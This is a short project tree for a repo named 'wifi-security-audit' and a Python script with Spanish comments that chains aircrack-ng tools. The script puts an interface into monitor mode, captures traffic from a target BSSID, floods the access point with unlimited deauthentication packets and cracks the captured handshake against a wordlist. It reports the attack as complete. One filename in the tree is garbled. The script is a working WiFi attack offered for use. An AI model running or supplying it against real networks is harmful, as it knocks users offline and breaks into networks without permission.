
wifi-security-audit/
│
├── README.md
├── requirements.txt
├── .gitignore
└── src/
    ├── __init__.py
    ├── wifi_scanner.py
    └── wifi_crack.p  profile.

import os

# Configuración
interface = "wlan0"
bssid = "00:11:22:33:44:55"
wordlist = "/path/to/wordlist.txt"
output_file = "crack_output.txt"

# Comandos
commands = [
    f"airmon-ng start {interface}",
    f"airodump-ng -w capture --bssid {bssid} {interface}mon",
    f"aireplay-ng --deauth 0 -a {bssid} {interface}mon",
    f"aircrack-ng -w {wordlist} -b {bssid} capture-01.cap > {output_file}"
]

# Ejecutar comandos
for cmd in commands:
    os.system(cmd)

print("Ataque completado. Revisa el archivo de salida para ver los resultados.") 
